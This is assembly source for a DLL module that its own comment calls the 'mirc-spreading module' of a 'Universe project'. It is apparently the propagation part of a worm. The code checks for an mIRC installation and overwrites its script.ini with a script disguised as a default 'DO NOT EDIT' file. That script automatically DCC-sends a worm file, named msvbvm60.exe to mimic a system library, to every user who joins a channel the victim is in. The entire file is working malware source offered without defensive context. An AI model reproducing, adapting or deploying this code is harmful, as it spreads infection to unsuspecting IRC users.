;mirc-spreading module, part of Universe project.


.386p
.model	flat

include	..\win32api.inc
include	..\useful.inc


invoke	macro	api					;macro for API callz
	extrn	api:PROC				;declare API
	call	api					;call it...
endm


.data
	Script		db	'[script]',CRLF		;script itself
			db	';Default mIRC32 script',CRLF
			db	';** DO NOT EDIT **',CRLF,CRLF
			db	'n0=on 1:JOIN:#:{',CRLF
			db	'n1=/if ($nick==$me) {halt}',CRLF
			db	'n2=/.dcc send $nick '
	tmppath		db	MAX_PATH+18 dup (?)	;path+filename of worm
	tmp		dd	?			;misc.

.code
Start:	mov	ecx,[esp+8]
	dec	ecx
	jecxz	perform_action			;must be DLL_PROCESS_ATTACH (1)
	ret

perform_action:
	pushad
	@SEH_SetupFrame	<jmp	end_seh>

	mov	edi,offset tmppath
	push	MAX_PATH
	push	edi
	invoke	GetSystemDirectoryA
	add	edi,eax
	call	@pth
	db	'\msvbvm60.exe',CRLF,'n3=}',CRLF,0
@pth:	pop	esi
	@copysz					;create last part of script

	push	edx
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	edx
	push	FILE_SHARE_READ or FILE_SHARE_WRITE
	push	edx
	@pushsz	'c:\mirc\mirc32.exe'		;check if c:\mirc\mirc32.exe
	invoke	CreateFileA			;exists
	inc	eax
	je	end_seh				;quit if not
	dec	eax
	push	eax
	invoke	CloseHandle

	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	CREATE_ALWAYS
	push	0
	push	0
	push	GENERIC_WRITE
	@pushsz	'c:\mirc\script.ini'
	invoke	CreateFileA			;create new file (mirc script)
	inc	eax
	je	end_seh
	dec	eax
	xchg	eax,ebx

	push	0
	push	offset tmp
	push	1000
	push	offset Script
	push	ebx
	invoke	WriteFile			;write the script to there

	push	ebx
	invoke	CloseHandle

end_seh:@SEH_RemoveFrame			;and quit
	popad
	ret
End	Start
